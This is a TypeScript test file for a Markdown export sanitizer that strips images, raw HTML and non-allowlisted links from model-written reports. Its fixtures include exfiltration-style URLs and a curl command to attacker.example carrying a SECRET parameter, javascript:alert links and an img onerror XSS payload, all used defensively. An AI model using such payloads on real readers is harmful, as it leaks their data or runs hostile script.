// The .md download and Copy (buildMarkdownFile) link only where the screen and the PDF/Word exports do: a
// Markdown viewer that renders HTML (GitHub, GitLab, mail previews) would otherwise load an image or raw HTML
// from model output with no click, or link a prompt-injected URL.
import type { Nodes, Root } from "mdast";
import remarkParse from "remark-parse";
import { unified } from "unified";
import { describe, expect, it } from "vitest";
import type { TaskSource } from "@/lib/api";
import { linkAllowed, markdownForExport, parseMarkdownTree } from "./markdown";
import { buildMarkdownFile } from "./shared";

const A = "attacker.example";
const R = "research.example.org";
const SOURCE: TaskSource = { n: 1, kind: "web", title: "Research", url: `https://${R}/r`, domain: R, snippet: "", publishedAt: null };
const ok = (url: string) => linkAllowed(url, [R]);

/** Every node of a tree, positions dropped. */
function nodes(n: Nodes, out: Nodes[] = []): Nodes[] {
  out.push(n);
  if ("children" in n) for (const c of n.children) nodes(c as Nodes, out);
  return out;
}
const strip = (n: unknown): unknown =>
  Array.isArray(n) ? n.map(strip) : n && typeof n === "object" ? Object.fromEntries(Object.entries(n).filter(([k]) => k !== "position").map(([k, v]) => [k, strip(v)])) : n;
const bodyOf = (file: string) => file.slice(0, file.indexOf("\n## Sources"));
const commonmark = unified().use(remarkParse);
/**
 * What a viewer would link or load in the file, as GFM reads it and as plain CommonMark does (no
 * tables or footnotes): every link or definition URL that is neither allowed nor relative, images, raw HTML.
 */
function live(file: string, allowed: (url: string) => boolean): string[] {
  const out: string[] = [];
  for (const tree of [parseMarkdownTree(file), commonmark.parse(file) as Root])
    for (const n of nodes(tree)) {
      if ((n.type === "link" || n.type === "definition") && !allowed(n.url) && /^\s*(?:[a-z][a-z0-9+.-]*:|[\\/]{2})/i.test(n.url)) out.push(`${n.type} ${n.url}`);
      if (n.type === "image" || n.type === "imageReference") out.push(n.type);
      if (n.type === "html" && !/^<br\s*\/?>$/i.test(n.value)) out.push(`html ${n.value}`);
    }
  return out;
}

describe("buildMarkdownFile", () => {
  const md = [
    "# Brief",
    "",
    `Data [1] from [the source](https://${R}/r), [bad](https://${A}/c?d=SECRET) and [ref][d] and [1].`,
    `![chart](https://${A}/p.png?d=SECRET) <img src="//${A}/p.png?d=SECRET"> <a href="https://${A}/c?d=SECRET">x</a> https://${A}/c?d=SECRET www.${A}/w sales@${A}`,
    "",
    "| a | b |",
    "|---|---|",
    `| x<br>y | \`curl https://${A}/x?d=SECRET\` |`,
    "",
    `<div><iframe src="https://${A}/f"></iframe></div>`,
    "",
    "```",
    `curl https://${A}/c?d=SECRET`,
    "```",
    "",
    `[d]: https://${A}/d?d=SECRET`,
    `[1]: https://${A}/one?d=SECRET`,
  ].join("\n");

  it("keeps allowed links, and turns the rest into text no viewer loads or links", () => {
    const file = buildMarkdownFile({ title: "T", markdown: md, sources: [SOURCE], linkDomains: [R] });
    const tree = parseMarkdownTree(file);
    const all = nodes(tree);
    expect(all.filter((n) => n.type === "image" || n.type === "imageReference")).toEqual([]);
    expect(all.filter((n) => n.type === "html").map((n) => (n as { value: string }).value)).toEqual(["<br>"]);
    const urls = all.flatMap((n) => (n.type === "link" || n.type === "definition" ? [n.url] : []));
    expect(urls).toEqual([`https://${R}/r`, `https://${R}/r`]); // the report's link, then the sources appendix
    // Refused links are their text ("[1]" stays a citation, as written), images their alt text; link-shaped text is reduced.
    expect(file).toContain(`Data [1] from [the source](https://${R}/r), bad and ref and [1].`);
    expect(file).toContain(`chart \\<img src="${A}"> \\<a href="${A}> ${A} ${A} an address at ${A}`);
    expect(file).toContain(`\\<div>\\<iframe src="${A}>`);
    expect(file).toContain(`| x<br>y | \`curl ${A}\` |`);
    expect(file).toContain(`\`\`\`\ncurl ${A}\n\`\`\``);
    expect(file).not.toMatch(/https?:\/\/attacker|\/\/attacker|www\.attacker|@attacker|SECRET|\[d\]:|\[1\]:/);
    // The title, meta line, sources appendix and note are as before.
    expect(file.startsWith("# Brief\n\n_")).toBe(true);
    expect(file).toContain(`## Sources\n\n1. [Research](https://${R}/r) — ${R} · Web\n`);
    expect(file.endsWith("Made with Ensemblis._\n")).toBe(true);
  });

  it("uses linkDomains when given (even empty), else the sources' domains", () => {
    const text = `[a](https://${R}/a) [b](https://evidence.example/b)`;
    const links = (linkDomains?: string[]) => [...bodyOf(buildMarkdownFile({ title: "T", markdown: text, sources: [SOURCE], linkDomains })).matchAll(/\]\((https:[^)]*)\)/g)].map((m) => m[1]);
    expect(links()).toEqual([`https://${R}/a`]);
    expect(links(["evidence.example"])).toEqual(["https://evidence.example/b"]);
    expect(links([])).toEqual([]);
  });

  it("leaves a benign report as it reads: tables with <br>, code, CJK and curly quotes, gov.uk, version pins, footnotes", () => {
    const benign = [
      "## Findings",
      "",
      "| Metric | Value | Source |",
      "|:--|--:|:-:|",
      "| Size | €1.2bn<br>(2025 est.) | [1] |",
      "| Leader | [Acme](https://acme.com) | [2] |",
      "",
      "- The vendor’s site “https://acme.com/pricing” lists prices [1].",
      // Spaced, so the autolink really is acme.com (glued CJK runs into the host: see the last assertion).
      "- 詳細は https://acme.com をご覧ください。",
      "- 请访问 https://acme.com/zh，了解更多。",
      "- [GOV.UK](https://www.gov.uk/guidance/vat) and https://www.gov.uk/government/statistics [2].",
      "",
      "We pin react@18.3.1 and @acme/sdk@2.1.0; deploy with `ssh deploy@10.0.0.5`.[^1]",
      "",
      "```bash",
      "npm i react@18.3.1 lodash@4.17.21",
      "```",
      "",
      "[^1]: From [Acme](https://acme.com/f).",
    ].join("\n");
    const allowed = ["acme.com", "gov.uk"];
    const out = markdownForExport(benign, (url) => linkAllowed(url, allowed));
    expect(out).toBe(`${benign}\n`);
    expect(strip(parseMarkdownTree(out))).toEqual(strip(parseMarkdownTree(benign)));
    // Run-on CJK prose a viewer would read on into as more host labels ("。" is a dot to it) keeps its text, not the scheme.
    expect(markdownForExport("詳細はhttps://acme.comをご覧ください。次へ", (url) => linkAllowed(url, allowed))).toBe("詳細はacme.comをご覧ください。次へ\n");
  });

  it("writes a changed span so it makes no new markup where it stands, and the whole report when an edit would", () => {
    // Kept as text (the host is allowed, but the URL is not a plain one), so no viewer may autolink it.
    expect(markdownForExport(`HTTP://${R}｡<b>`, ok)).toBe(`HTTP\\://${R}｡\\<b>\n`);
    // Nothing to change: "[k]" followed by a colon is not a definition, so the line stays as written.
    const kept = `[k]:(&#41; and [k]://${A}/x &quot;t&quot;\n\n[k]: https://${R}/ok`;
    expect(markdownForExport(kept, ok)).toBe(`${kept}\n`);
    // Dropping the image would put "[k]:" at a line start, a definition: the report is written whole, which escapes it.
    const out = markdownForExport(`[k]![](https://${A}/i.png): https://${A}/x\n\n[k]: https://${R}/ok`, ok);
    expect(out).toBe(`[k]\\: ${A}\n\n[k]: https://${R}/ok\n`);
    expect(nodes(parseMarkdownTree(out)).filter((n) => n.type === "definition")).toHaveLength(1);
  });

  // The verifier's benign shapes (review round 5): every one byte-identical, not just the same tree.
  it("writes a benign report byte for byte as it is: citations, reference lines, allowed URLs and addresses, lists, fences, tables", () => {
    const allowed = ["acme.com", "ec.europa.eu", "en.wikipedia.org", "statista.com"];
    const benign = [
      "# Market entry brief",
      "",
      "## Executive summary",
      "",
      "- The EU SaaS market grew 12% in 2025 [1].",
      "- Competitors are consolidating [2, 3]; pricing ranges from €20–€40 per seat [4–5].",
      "* Star bullet with _under_ and *emphasis*",
      "+ Plus bullet with ~~strike~~ and `code`",
      "",
      "Per https://en.wikipedia.org/wiki/Software_as_a_service, SaaS is defined as… [4]",
      "Contact sales@acme.com or <press@acme.com>; see www.acme.com and <https://acme.com/a>.",
      "Prices are $5 * 3 = $15; file_name_here, 2 < 3 > 1, C# and 100% sure; [draft] (see 1.).",
      "",
      "#hashtag at start",
      "",
      "1) one",
      "2) two",
      "",
      "| Metric      | Value  | Source |",
      "|:------------|-------:|:------:|",
      "| Market size | €1.2bn<br>(2025 est.) | [1] |",
      "| Leader      | [Acme](https://acme.com) | [3] |",
      "",
      "> **Note:** figures are from https://ec.europa.eu/eurostat/web/main [1].",
      "",
      "~~~python",
      "print('hello')",
      "~~~",
      "",
      "“https://acme.com/pricing”列出了价格。",
      "",
      "Claim with a note.[^1]",
      "",
      "[^1]: Note: the figures are estimates, see https://acme.com/f.",
      "",
      "## Sources",
      "",
      "[1] Eurostat — ec.europa.eu",
      "[2] Statista — statista.com",
    ].join("\n");
    const file = buildMarkdownFile({ title: "T", markdown: benign, sources: [SOURCE], linkDomains: allowed });
    expect(file.startsWith(`${benign.replace("# Market entry brief\n", "# Market entry brief\n\n_")}`.slice(0, 22))).toBe(true);
    expect(file.slice(file.indexOf("## Executive summary"), file.indexOf("\n\n## Sources\n\n1. "))).toBe(benign.slice(benign.indexOf("## Executive summary")));
    // Raw HTML is the one benign shape written anew (as text, as the screen shows it), and only its own spans.
    const html = "H<sub>2</sub>O and E = mc<sup>2</sup>, press <kbd>Ctrl</kbd> [1].\n<!-- note -->\nNext [2].";
    expect(markdownForExport(html, ok)).toBe("H\\<sub>2\\</sub>O and E = mc\\<sup>2\\</sup>, press \\<kbd>Ctrl\\</kbd> [1].\n\n\\<!-- note -->\n\nNext [2].\n");
  });

  it("writes anew only the outermost span the allowlist changes, nested and overlapping ones included, in its place", () => {
    const fix = (md: string) => markdownForExport(md, (url) => linkAllowed(url, ["acme.com", "ec.europa.eu"]));
    // A refused link amid citations: only its span changes, "[1]" and "[2, 3]" stay as written.
    expect(fix(`Growth was 12% [1] per [the vendor](https://${A}/x?d=SECRET) and [Eurostat](https://ec.europa.eu/x) [2, 3].`)).toBe(
      "Growth was 12% [1] per the vendor and [Eurostat](https://ec.europa.eu/x) [2, 3].\n"
    );
    // A refused link holding an image, raw HTML and a URL; an allowed link holding an image; emphasis holding a refused link.
    expect(fix(`[See ![chart](https://${A}/c.png) <b>here</b> https://${A}/q](https://${A}/x) and [![logo](https://acme.com/l.png)](https://acme.com) and *[x](https://${A}) [1]*`)).toBe(
      `See chart \\<b>here\\</b> ${A} and [logo](https://acme.com) and *x [1]*\n`
    );
    // In a quoted list item: its continuation lines and a code block keep their prefixes.
    expect(fix(`> - item [x](https://${A}/a) [1]\n>   more https://${A}/b text\n>\n>   \`\`\`\n>   curl https://${A}/c\n>   \`\`\``)).toBe(
      `> - item x [1]\n>   more ${A} text\n>\n>   \`\`\`\n>   curl ${A}\n>   \`\`\`\n`
    );
    // In a table cell: the rest of the row and its padding stay; an indented code block becomes a fenced one in its list item.
    expect(fix(`| a | b |\n|---|---|\n| [x](https://${A}/x) [1] | \`a|b\` and https://${A}/y |\n\n- item\n\n      curl https://${A}/z`)).toBe(
      `| a | b |\n|---|---|\n| x [1] | \`a|b\` and ${A} |\n\n- item\n\n  \`\`\`\n  curl ${A}\n  \`\`\`\n`
    );
    // A changed span at a line start is escaped as a line start (no heading or list item appears).
    expect(fix(`[# x](https://${A}) and *[# y](https://${A})*\n\n[- z](https://${A})`)).toBe("\\# x and *# y*\n\n\\- z\n");
  });

  // A viewer without GFM footnotes reads "[^1]: <destination>" as a link definition, and "x[^1]" as a link to it.
  it("reduces a footnote's first word that such a viewer would read as a refused destination", () => {
    const cases = [
      `x[^1]\n\n[^1]: //research.example.org｡${A}\n text `,
      `x[^1]\n\n[^1]: javascript://ATTACKER.EXAMPLE#x\n text x[^1]`,
      `x[^1]\n\n[^1]: ftp://research.example.orgx/p_(x)\n`,
      `x[^1]\n\n[^1]: <mailto:a@research.example.org。${A}/%2e%2e/>\n`,
      `x[^1]\n\n[^1]: \\\\\\\\${A}/p "t"`,
      `x[^1]\n\n[^1]: <//${A}/p>`,
      `x[^1]\n\n[^1]: &#47;&#47;${A}/p`,
      `x[^1]\n\n[^1]:\n    //${A}/p`,
      `x[^1]\n\n[^1]: //2130706433/p*\n`,
    ];
    for (const md of cases) {
      const file = buildMarkdownFile({ title: "T", markdown: md, sources: [SOURCE], linkDomains: [R] });
      expect(live(file, ok), md).toEqual([]);
      expect(file, md).not.toMatch(/\[\^1\]: *(?:<?\/\/|\\\\|javascript|ftp|mailto)/i);
    }
    // A protocol-relative URL in text is judged too; benign footnotes stay as written.
    expect(markdownForExport(`See //${A}/x?d=SECRET for more, and a/b//c and https://${R}/a//b.`, ok)).toBe(`See ${A} for more, and a/b//c and https://${R}/a//b.\n`);
    const notes = "A claim.[^1] Another.[^2]\n\n[^1]: Note: the figures are estimates.\n[^2]: From https://research.example.org/f and //research.example.org/g.";
    expect(markdownForExport(notes, ok)).toBe(`${notes}\n`);
  });

  // Review round 6: only what CommonMark reads as a definition's destination counts (the word alone on its line, or a
  // complete title after it and nothing else), and one with no host to show stays, as code: no footnote is emptied,
  // so the report is not written whole (which would escape every "[n]").
  it("keeps a footnote's first words as written unless a viewer without footnotes reads them as a refused destination", () => {
    const allowed = (url: string) => linkAllowed(url, ["acme.com", "ec.europa.eu"]);
    for (const body of [
      'Source: "EU SaaS Market 2024", Eurostat, p. 12.',
      "Note: (estimate) based on 2023 filings.",
      'Q3: "flat" per the CFO.',
      "[Eurostat: (2024)](https://ec.europa.eu/x)",
      // An inline node after the word on the same line: no definition either (the line decides, not the first text node).
      "Source: [Eurostat](https://ec.europa.eu/eurostat), 2024.",
      "Source: **Eurostat**, p. 12.",
      "Note: *estimate* based on 2023 filings.",
      "See: `table 4` in the annex.",
      "Data: [Acme pricing page](https://acme.com/pricing) (accessed 2025).",
    ]) {
      const md = `Claim [1].[^1]\n\n[^1]: ${body}`;
      expect(markdownForExport(md, allowed), md).toBe(`${md}\n`);
    }
    // These such a viewer does read as a definition of "^1" (a scheme, then nothing or a complete title): the word
    // stays, as code, which it reads as a destination on its own site. The rest of the report is as written.
    const doi = "## Summary\n\n- The market grew 12% in 2025 [1].\n- Acme leads on price [2].\n\nAdoption doubled.[^1]\n\n[^1]: doi:10.1016/j.respol.2020.104000\n";
    const defined: [string, string][] = [
      [doi, "doi:10.1016/j.respol.2020.104000"],
      ["Per the standard [1].[^s]\n\n[^s]: urn:iso:std:iso:8601\n", "urn:iso:std:iso:8601"],
      ["Claim [1].[^1]\n\n[^1]: ISBN:978-3-16 (2nd ed.)\n", "ISBN:978-3-16"],
      ["Claim.[^1]\n\n[^1]: Eurostat:\n", "Eurostat:"],
      [`x[^1]\n\n[^1]: javascript:alert(1)\n`, "javascript:alert(1)"],
    ];
    for (const [md, word] of defined) {
      expect(nodes(commonmark.parse(md) as Root).filter((n) => n.type === "definition"), md).toHaveLength(1);
      const out = markdownForExport(md, allowed);
      expect(out, md).toBe(md.replace(word, `\`${word}\``));
      expect(live(out, allowed), md).toEqual([]);
    }
    const file = buildMarkdownFile({ title: "T", markdown: doi, sources: [SOURCE], linkDomains: ["acme.com", "ec.europa.eu"] });
    expect(file).toContain("\n- The market grew 12% in 2025 [1].\n- Acme leads on price [2].\n");
    // A title CommonMark does not end where it reads one (an escaped quote) still leaves nothing live.
    expect(live(markdownForExport(`x[^1]\n\n[^1]: //2130706433/p "a \\" b"`, ok), ok)).toEqual([]);
  });

  it('keeps a citation "[n]" as written when its reference definition is refused', () => {
    const allowed = (url: string) => linkAllowed(url, ["ec.europa.eu", "acme.com"]);
    // As the stored text has it (the cleaner puts a refused destination in backticks), and as the model wrote it.
    for (const def of ["`https://www.acme.de/p`", "https://www.acme.de/p"]) {
      const md = `Growth was 12% [1] and margins 8% [2].\n\n[1]: https://ec.europa.eu/x\n[2]: ${def}`;
      expect(markdownForExport(md, allowed)).toBe("Growth was 12% [1] and margins 8% [2].\n\n[1]: https://ec.europa.eu/x\n");
    }
    // Only a shortcut written just "[n]" stays as written: "[2][]" and "[x][2]" are their text, written anew.
    expect(markdownForExport("Growth [2][] and [x][2] and [2].\n\n[2]: https://www.acme.de/p", allowed).trimEnd()).toBe("Growth \\[2] and x and [2].");
  });

  // Review round 6: 16000 refused URLs on one line took 9 s (each edit re-sliced the whole text and scanned back to its line start).
  it("stays linear in the number of changes on one line", () => {
    const line = `https://${A} `.repeat(16000);
    for (const md of [line, `Intro\n${line}`]) {
      let t = performance.now();
      parseMarkdownTree(md);
      const parse = performance.now() - t;
      t = performance.now();
      const out = markdownForExport(md, ok);
      const took = performance.now() - t;
      expect(out).toBe(`${md.replaceAll(`https://${A}`, A)}\n`);
      // Under 2 s; on a machine where the parser alone takes over half a second for this text, under four times that.
      expect(took).toBeLessThan(Math.max(2000, 4 * parse));
    }
  }, 60_000);

  it("writes the report whole when a viewer without GFM tables would link across cells", () => {
    const md = `| a | b |\n|---|---|\n| [x | ](//${A}/a) |\n| [y | ](javascript:alert(1)) |`;
    const out = markdownForExport(md, ok);
    expect(live(out, ok)).toEqual([]);
    expect(out).toContain("\\[y");
  });

  it("writes source and report titles as text that makes no markup", () => {
    // A search result's title is the page's own: markup, a link, a URL.
    const markup = "Q3 <b>update</b> <img src=x onerror=alert(1)> *bold* _u_ `c` <a href=//attacker.example>";
    const linked = `${markup} [x](https://${A}/s) https://${A}/t`;
    const sources = [{ ...SOURCE, title: linked }, { ...SOURCE, n: 2, url: null, title: markup }];
    const file = buildMarkdownFile({ title: `Brief <b>x</b> [y](https://${A}/t) *`, markdown: "Body [1].", sources, linkDomains: [R] });
    expect(live(file, ok)).toEqual([]);
    expect(file.startsWith(`# Brief \\<b>x\\</b> \\[y]\\(${A}) \\*\n`)).toBe(true);
    // Each title reads as exactly its text, linked to the source's own URL when it has one.
    const items = parseMarkdownTree(file).children.find((n) => n.type === "list");
    const text = (n: Nodes): string => ("value" in n ? String(n.value) : "children" in n ? n.children.map((c) => text(c as Nodes)).join("") : "");
    expect(items && text(items)).toBe(`${linked} — ${R} · Web${markup} — ${R} · Web`);
    expect(nodes(parseMarkdownTree(file)).flatMap((n) => (n.type === "link" ? [n.url] : []))).toEqual([`https://${R}/r`]);
  });

  it("reduces a refused URL with a non-ASCII path to its domain, keeping the prose after it", () => {
    const wiki = (md: string) => buildMarkdownFile({ title: "T", markdown: md, sources: [SOURCE], linkDomains: ["en.wikipedia.org"] });
    expect(wiki("Siehe https://de.wikipedia.org/wiki/Straße für Details [1].")).toContain("\nSiehe wikipedia.org für Details [1].\n");
    expect(wiki("See https://fr.wikipedia.org/wiki/Économie_de_la_France for more [1].")).toContain("\nSee wikipedia.org for more [1].\n");
    // As the stored text has it (the cleaner puts a refused URL in backticks).
    expect(wiki("Siehe `https://de.wikipedia.org/wiki/Straße` für Details [1].")).toContain("\nSiehe `wikipedia.org` für Details [1].\n");
    expect(wiki("See `https://fr.wikipedia.org/wiki/Économie_de_la_France` for more [1].")).toContain("\nSee `wikipedia.org` for more [1].\n");
  });

  it("never throws: markdown the parser cannot read is the reduced text as a code block", () => {
    const deep = `${"> ".repeat(20000)}<img src="//${A}/p.png"> \`\`\`\` https://${A}/c?d=SECRET`;
    const out = markdownForExport(deep, ok);
    expect(out.startsWith("`````\n> > ")).toBe(true);
    expect(out.endsWith(`<img src="//${A}/p.png"> \`\`\`\` ${A}\n\`\`\`\`\`\n`)).toBe(true);
  });
});
